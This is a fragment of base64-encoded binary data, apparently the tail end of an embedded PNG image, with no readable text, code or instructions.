PO6+6f3PvEc9Og9bMbbppOk8Dy17c9Og0xOp9dhswjwzKPkOUofS5tZXnaRsjyPrD9odmwvoZn32MNUKFt0OnyOn4eHS4aEGVd/DKWV85Ml+1Dn6xHVlv/Wn5YyXjZdvl30DZZj0LaShEQgQ70qQPUdbVH4mzgkEcJdLatPupRMDtOn+vRNF2uDU72uT7ao2B2Pn1tNe+1lYRSCZ5Cp0vA0lDmg1we3zbvdfO20x81DQVEO4+EU2kjj7adhEQdlm3MO4oaoz6ta1N8MOgLDUxaQoOTBBt9lKNwEv7sdsqjhDp51NAnbXSaDTihcf5Rj5xJcNSjfj74yetpkLTz+3Y6XrchNK5oQBR+GUJe0wZgFWrr/wOhr61l6brpc/so/DbJ+y7LJyACHdAA0geyrhJA5LSmHiGUcXLUTJ/btkXHhcKPDvvgJDRQ2nEakCw5qqjL1iNy/nV0nC2hAdFOt0LjRNWA6EO3HBW1Qu+R0HG6/TJs19ueXtZptk3M/Hs5Vnr6r29knX24ssFJH3WctNUjezbgaHCU90FIGwmLEggl7Emok+Cn7fx8tvyyPdtGH/026JFFLbvO+ihHR/3y572mfS7bp4HYCrX1AdGS8fZIpAzbgCjPNRSHQrdsu77HfZP1nhRBQEQUJAjYTjxmoc5axmnAlecSVHyok2F7ZEse9VSsHeeDn4QYvyw52ufns+0921aHNfzZIKUkVEoAttP9Ubkssq7y7ylt7Xtiw51Oy2prvzupjzJdx9u2+qjfQ/Tz2G3V0886XpcTM3v0c+zqdHZdkXWW8CIhQ0qCyryAKI8aiO0pXg1B9sijLsOHGg06uhwbFPV0sw9Ddn6dV4f9NtjX1zb2UZ+Hlu/ptsujrpM/ZazPbVvdNm2rp4F13eVRj8Da/2Doeuk89lS7jNPtlHlkeVLSxp6y74NQQC+DgIho9KUTDIUKGadHE3XYH/3S7xXa+fV0sB2n7ZS0kWX7NvZUsk6TR/u9PaWhyA9raXCydLxdnm8T4pet7Psh43WbirTVR9/WzmPfN/2+prxHdh7/b9QHsl/4v6Wx0osi+kQDhpYEIAlWegRLH3WcBjnp3O0yNKzJ/P5onoYdy393zy5PyOv5NkqDkQptg52ubeyjPvftQvyyhV9fu3wtfU9sW/veCruNdrzdRnsa2y7fBmD9d+sT+ZvQ97MKAiKiIUdK7IUYwNjJ/tCXI+tt8UFoaDQgFhUKh8AivpJBQERU9FQhMHZ9u5CmLXp6E0A22Uf0CGtVBERExX6PDBgz/rOUTTo/uTUKgDS9Wr0uAiKioxdghL5LB4yB/P1zajmfdICh+/gBY7bIrxwQEBGl0K9xAEOnf/OhG54jTTvD0K1QgDGR2/DIvpB14VEVBERETX7RQztNKfnSvoyzt2ihqD6W/B3rrYO09BdsUI4GRSnpKO0tWShqiKW3PNLSX+JZJAIiekN/j1g6VYoaQsnfc19ut9MXtgOlqKGW/I0XuYVQHQREAAAAJBAQAQAAkEBABAAAQAIBEQAAAAkERAAAACQQEAEAAJBAQAQAAEACAREAAAAJBEQAAAAkEBABAACQQEAEAABAAgERAAAACQREAAAAJPx/GSRMzLbJiNwAAAAASUVORK5CYII=>